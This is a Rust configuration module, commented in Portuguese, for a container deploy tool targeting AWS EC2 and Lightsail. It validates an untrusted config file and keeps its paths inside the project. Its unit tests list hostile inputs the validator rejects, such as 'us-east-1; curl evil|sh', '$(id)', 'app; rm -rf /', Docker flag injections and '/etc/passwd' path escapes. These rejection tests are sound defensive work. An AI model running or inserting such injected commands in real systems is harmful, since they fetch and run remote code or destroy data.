use anyhow::{Context, Result, bail};
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use std::str::FromStr;

pub const FILE: &str = "skyship.toml";

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Config {
    pub name: String,
    pub region: String,
    /// Porta em que o app escuta dentro do container.
    pub port: u16,
    #[serde(default = "d_dockerfile")]
    pub dockerfile: String,
    #[serde(default = "d_context")]
    pub context: String,
    /// "linux/amd64" por padrão, para funcionar mesmo buildando em máquina ARM.
    #[serde(default = "d_platform")]
    pub platform: String,
    pub target: Target,
    /// Imagem Docker que já existe neste computador (ex.: `meuapp:1.0`). Quando presente, o deploy
    /// não faz build: envia essa imagem, e `dockerfile` e `context` são ignorados.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub image: Option<String>,
    #[serde(default)]
    pub ec2: Ec2,
    #[serde(default)]
    pub lightsail: Lightsail,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum Target {
    Ec2,
    Lightsail,
}

impl FromStr for Target {
    type Err = String;
    fn from_str(s: &str) -> std::result::Result<Self, String> {
        match s.to_ascii_lowercase().as_str() {
            "ec2" => Ok(Target::Ec2),
            "lightsail" => Ok(Target::Lightsail),
            other => Err(format!("destino desconhecido {other:?} (use ec2 ou lightsail)")),
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Ec2 {
    #[serde(default = "d_itype")]
    pub instance_type: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Lightsail {
    #[serde(default = "d_power")]
    pub power: String,
    #[serde(default = "d_scale")]
    pub scale: i32,
}

impl Default for Ec2 {
    fn default() -> Self {
        Self {
            instance_type: d_itype(),
        }
    }
}
impl Default for Lightsail {
    fn default() -> Self {
        Self {
            power: d_power(),
            scale: d_scale(),
        }
    }
}

fn d_dockerfile() -> String {
    "Dockerfile".into()
}
fn d_context() -> String {
    ".".into()
}
fn d_platform() -> String {
    "linux/amd64".into()
}
fn d_itype() -> String {
    "t3.micro".into()
}
fn d_power() -> String {
    "nano".into()
}
fn d_scale() -> i32 {
    1
}

impl Config {
    pub fn new(name: String, region: String, port: u16, target: Target) -> Self {
        Self {
            name,
            region,
            port,
            dockerfile: d_dockerfile(),
            context: d_context(),
            platform: d_platform(),
            target,
            image: None,
            ec2: Ec2::default(),
            lightsail: Lightsail::default(),
        }
    }

    /// Lê `skyship.toml` do diretório atual.
    pub fn load() -> Result<Self> {
        Self::load_from(Path::new("."))
    }

    /// Lê `skyship.toml` de `dir`, valida os campos e prende `context` e `dockerfile` dentro
    /// de `dir`. O arquivo é tratado como entrada não confiável (pode vir de um projeto de
    /// terceiros). Depois do load, os dois caminhos ficam absolutos e canônicos.
    pub fn load_from(dir: &Path) -> Result<Self> {
        let path = dir.join(FILE);
        let raw = std::fs::read_to_string(&path)
            .with_context(|| format!("não achei {} (rode `skyship init`)", path.display()))?;
        let mut c: Config = toml::from_str(&raw).with_context(|| format!("{} inválido", path.display()))?;
        c.validate()?;
        c.confine_paths(dir)?;
        Ok(c)
    }

    /// Lê e valida os campos, mas mantém `context` e `dockerfile` como estão no arquivo (relativos).
    /// Serve para editar e regravar o `skyship.toml`; para rodar um deploy use [`Config::load_from`].
    pub fn load_unresolved(dir: &Path) -> Result<Self> {
        let path = dir.join(FILE);
        let raw = std::fs::read_to_string(&path).with_context(|| format!("não achei {}", path.display()))?;
        let c: Config = toml::from_str(&raw).with_context(|| format!("{} inválido", path.display()))?;
        c.validate()?;
        Ok(c)
    }

    pub fn save(&self) -> Result<()> {
        self.save_to(Path::new("."))
    }

    pub fn save_to(&self, dir: &Path) -> Result<()> {
        let path: PathBuf = dir.join(FILE);
        if path.exists() {
            bail!("{} já existe", path.display());
        }
        self.write_to(dir)
    }

    /// Grava `skyship.toml` em `dir`, substituindo o que existir. Os caminhos gravados são os
    /// relativos originais, então use um `Config` criado por [`Config::new`], não um já resolvido
    /// por [`Config::load_from`].
    pub fn write_to(&self, dir: &Path) -> Result<()> {
        self.validate()?;
        std::fs::write(dir.join(FILE), toml::to_string_pretty(self)?)?;
        Ok(())
    }

    /// Resolve `context` e `dockerfile` (relativos a `dir`) e garante que ficam dentro de `dir`.
    /// Rejeita caminhos absolutos, `..` que escapam e links simbólicos que apontam para fora,
    /// para que um `skyship.toml` alheio não faça o build empacotar arquivos pessoais
    /// (ex.: `~/.aws`) dentro da imagem enviada.
    pub fn confine_paths(&mut self, dir: &Path) -> Result<()> {
        let root = dir
            .canonicalize()
            .with_context(|| format!("pasta do projeto inacessível: {}", dir.display()))?;
        // Só confere a contenção aqui. Se os arquivos existem, o tipo também é conferido; se não
        // existem, quem precisa deles (o deploy) reclama. `status` e `destroy` não precisam deles.
        let context = confine(&root, &self.context, "context")?;
        if context.exists() && !context.is_dir() {
            bail!("context não é uma pasta: {}", context.display());
        }
        let dockerfile = confine(&root, &self.dockerfile, "dockerfile")?;
        if dockerfile.exists() && !dockerfile.is_file() {
            bail!("dockerfile não é um arquivo: {}", dockerfile.display());
        }
        self.context = context.to_string_lossy().into_owned();
        self.dockerfile = dockerfile.to_string_lossy().into_owned();
        Ok(())
    }

    /// Valida todos os campos que acabam em comandos, nomes de recursos ou scripts remotos.
    pub fn validate(&self) -> Result<()> {
        let ok_name = !self.name.is_empty()
            && self.name.len() <= 40
            && self
                .name
                .chars()
                .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
            && !self.name.starts_with('-')
            && !self.name.ends_with('-');
        if !ok_name {
            bail!(
                "name deve ter só minúsculas, números e '-' (até 40 chars): {:?}",
                self.name
            );
        }
        if !valid_region(&self.region) {
            bail!(
                "region desconhecida: {:?} (veja as aceitas com `skyship regions`)",
                self.region
            );
        }
        if self.port == 0 {
            bail!("port deve estar entre 1 e 65535");
        }
        if let Some(img) = &self.image
            && !valid_image_ref(img)
        {
            bail!("image inválida: {img:?} (esperava algo como meuapp:1.0)");
        }
        if !valid_platform(&self.platform) {
            bail!(
                "platform inválida: {:?} (esperava algo como linux/amd64)",
                self.platform
            );
        }
        if !valid_instance_type(&self.ec2.instance_type) {
            bail!(
                "ec2.instance_type inválido: {:?} (esperava algo como t3.micro)",
                self.ec2.instance_type
            );
        }
        let p = &self.lightsail.power;
        if p.is_empty() || p.len() > 10 || !p.chars().all(|c| c.is_ascii_lowercase()) {
            bail!("lightsail.power inválido: {p:?} (ex.: nano, micro, small)");
        }
        if !(1..=20).contains(&self.lightsail.scale) {
            bail!("lightsail.scale deve estar entre 1 e 20");
        }
        Ok(())
    }
}

/// Só regiões da lista fechada em [`crate::regions`].
fn valid_region(r: &str) -> bool {
    crate::regions::is_known(r)
}

/// `t3.micro`, `m6i.2xlarge`, `u-6tb1.metal`: duas partes separadas por um ponto.
fn valid_instance_type(t: &str) -> bool {
    let ok = |s: &str| {
        !s.is_empty()
            && s.chars()
                .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-')
    };
    t.len() <= 30
        && t.split_once('.')
            .is_some_and(|(a, b)| ok(a) && ok(b) && !b.contains('.'))
}

/// Referência de imagem Docker (`nome`, `nome:tag`, `registry/org/nome:tag`, `nome@sha256:...`).
/// Não pode começar com `-` (viraria uma opção do `docker`) nem ter espaços ou caracteres de shell.
pub fn valid_image_ref(r: &str) -> bool {
    !r.is_empty()
        && r.len() <= 200
        && r.chars().next().is_some_and(|c| c.is_ascii_alphanumeric())
        && r.chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | ':' | '@'))
        && !r.contains("..")
}

/// `linux/amd64`, `linux/arm64`, `linux/arm/v7`.
fn valid_platform(p: &str) -> bool {
    let parts: Vec<&str> = p.split('/').collect();
    (2..=3).contains(&parts.len())
        && parts
            .iter()
            .all(|s| !s.is_empty() && s.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit()))
}

/// Junta `rel` a `root`, resolve links e `..` e exige que o resultado continue dentro de `root`.
pub(crate) fn confine(root: &Path, rel: &str, field: &str) -> Result<PathBuf> {
    let rel_path = Path::new(rel);
    if rel.is_empty() || rel_path.is_absolute() {
        bail!("{field} deve ser um caminho relativo à pasta do projeto: {rel:?}");
    }
    let full = root.join(rel_path);
    let canon = match full.canonicalize() {
        Ok(c) => c,
        // ainda não existe: sem como resolver links, então só vale a regra léxica (sem `..`)
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
            if rel_path
                .components()
                .any(|c| matches!(c, std::path::Component::ParentDir))
            {
                bail!("{field} não pode conter `..` quando o caminho não existe: {rel:?}");
            }
            return Ok(full);
        }
        Err(e) => return Err(e).with_context(|| format!("{field} inacessível: {}", full.display())),
    };
    if !canon.starts_with(root) {
        bail!(
            "{field} aponta para fora da pasta do projeto ({}); isso não é permitido",
            canon.display()
        );
    }
    Ok(canon)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn cfg() -> Config {
        Config::new("app".into(), "us-east-1".into(), 8080, Target::Lightsail)
    }

    fn project() -> PathBuf {
        use std::sync::atomic::{AtomicUsize, Ordering};
        static N: AtomicUsize = AtomicUsize::new(0);
        let d = std::env::temp_dir().join(format!(
            "skyship-test-{}-{}",
            std::process::id(),
            N.fetch_add(1, Ordering::SeqCst)
        ));
        std::fs::create_dir_all(d.join("sub")).unwrap();
        std::fs::write(d.join("Dockerfile"), "FROM scratch\n").unwrap();
        d
    }

    #[test]
    fn defaults_are_valid() {
        cfg().validate().unwrap();
    }

    #[test]
    fn region_must_not_carry_shell() {
        for bad in [
            "us-east-1; curl evil|sh",
            "us-east-1\n",
            "$(id)",
            "US-EAST-1",
            "us-east",
            "",
            "x-y-1",
            "us-east-123",
            "us-gov-west-1",
            "us-east-9",
        ] {
            let mut c = cfg();
            c.region = bad.into();
            assert!(c.validate().is_err(), "deveria rejeitar region {bad:?}");
        }
        for good in ["us-east-1", "us-east-2", "sa-east-1", "ap-southeast-2", "eu-central-1"] {
            let mut c = cfg();
            c.region = good.into();
            c.validate().unwrap_or_else(|e| panic!("{good}: {e}"));
        }
    }

    #[test]
    fn image_reference_is_validated() {
        for good in [
            "meuapp",
            "meuapp:1.0",
            "gitea/gitea:1.24",
            "mcr.microsoft.com/dotnet/sdk:10.0",
            "app@sha256:abc123",
        ] {
            let mut c = cfg();
            c.image = Some(good.into());
            c.validate().unwrap_or_else(|e| panic!("{good}: {e}"));
        }
        for bad in [
            "",
            "-v /:/x",
            "--privileged",
            "app; rm -rf /",
            "app name",
            "a..b",
            "$(id)",
            "app\n",
        ] {
            let mut c = cfg();
            c.image = Some(bad.into());
            assert!(c.validate().is_err(), "deveria rejeitar image {bad:?}");
        }
    }

    #[test]
    fn image_survives_a_toml_round_trip_and_is_omitted_when_absent() {
        let mut c = cfg();
        assert!(!toml::to_string(&c).unwrap().contains("image"));
        c.image = Some("meuapp:1.0".into());
        let back: Config = toml::from_str(&toml::to_string(&c).unwrap()).unwrap();
        assert_eq!(back.image.as_deref(), Some("meuapp:1.0"));
    }

    #[test]
    fn other_fields_are_checked() {
        let mut c = cfg();
        c.ec2.instance_type = "t3.micro; reboot".into();
        assert!(c.validate().is_err());
        let mut c = cfg();
        c.ec2.instance_type = "m6i.2xlarge".into();
        c.validate().unwrap();
        let mut c = cfg();
        c.platform = "linux/amd64 --privileged".into();
        assert!(c.validate().is_err());
        let mut c = cfg();
        c.port = 0;
        assert!(c.validate().is_err());
        let mut c = cfg();
        c.lightsail.scale = 99;
        assert!(c.validate().is_err());
        let mut c = cfg();
        c.name = "Meu_App".into();
        assert!(c.validate().is_err());
    }

    #[test]
    fn paths_inside_project_are_accepted_and_made_absolute() {
        let d = project();
        let mut c = cfg();
        c.context = "sub/..".into();
        c.confine_paths(&d).unwrap();
        assert!(Path::new(&c.context).is_absolute());
        assert!(Path::new(&c.dockerfile).ends_with("Dockerfile"));
    }

    #[test]
    fn paths_escaping_project_are_rejected() {
        let d = project();
        for (ctx, df) in [
            ("..", "Dockerfile"),
            ("/", "Dockerfile"),
            (".", "../outro/Dockerfile"),
            (".", "/etc/passwd"),
            ("sub/../..", "Dockerfile"),
        ] {
            let mut c = cfg();
            c.context = ctx.into();
            c.dockerfile = df.into();
            assert!(
                c.confine_paths(&d).is_err(),
                "deveria rejeitar context={ctx:?} dockerfile={df:?}"
            );
        }
    }

    #[test]
    fn missing_dockerfile_is_ok_to_load_but_dotdot_is_not() {
        let d = project();
        std::fs::remove_file(d.join("Dockerfile")).unwrap();
        let mut c = cfg();
        c.confine_paths(&d).unwrap(); // status/destroy não precisam do Dockerfile
        let mut c = cfg();
        c.dockerfile = "../nao-existe/Dockerfile".into();
        assert!(c.confine_paths(&d).is_err());
    }

    #[test]
    fn symlink_pointing_outside_is_rejected() {
        let d = project();
        std::os::unix::fs::symlink("/etc", d.join("link")).unwrap();
        let mut c = cfg();
        c.context = "link".into();
        assert!(c.confine_paths(&d).is_err());
    }

    #[test]
    fn load_from_applies_both_checks() {
        let d = project();
        let mut c = cfg();
        c.region = "us-east-1".into();
        c.save_to(&d).unwrap();
        let loaded = Config::load_from(&d).unwrap();
        assert!(Path::new(&loaded.context).is_absolute());

        let evil = std::fs::read_to_string(d.join(FILE))
            .unwrap()
            .replace("context = \".\"", "context = \"..\"");
        std::fs::write(d.join(FILE), evil).unwrap();
        assert!(Config::load_from(&d).is_err());
    }
}
